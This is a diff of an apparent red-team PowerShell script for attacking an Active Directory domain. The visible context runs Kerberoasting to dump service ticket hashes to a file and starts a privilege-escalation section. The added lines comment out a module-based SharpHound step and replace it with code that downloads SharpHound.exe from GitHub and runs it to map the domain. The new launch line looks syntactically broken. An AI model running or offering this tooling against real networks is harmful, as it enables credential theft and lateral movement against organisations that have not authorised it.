@@ -63,6 +63,7 @@ Write-Host "Running Kerberoast" -ForegroundColor  Yellow
 Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
 
 #SharpHound
+<#
 If(!(test-path $modulepath/Sharp))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
@@ -77,6 +78,19 @@ Write-Host "Importing module..."
 Import-Module Sharp.ps1
 Write-Host "Running SharpHound" -ForegroundColor  Yellow
 Invoke-BloodHound -CSVFolder $path | Out-Null
+#>
+
+#BloodHound EXE method
+If(!(test-path $modulepath/Sharp))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
+}
+Write-Host "Fetching Sharphound.exe..."
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
+Write-Host "Running SharpHound" -ForegroundColor  Yellow
+$modulepath/Sharp/Sharp.exe -CSVFolder $path | Out-Null
 
 #PrivEsc
 If(!(test-path $modulepath/PrivEsc))
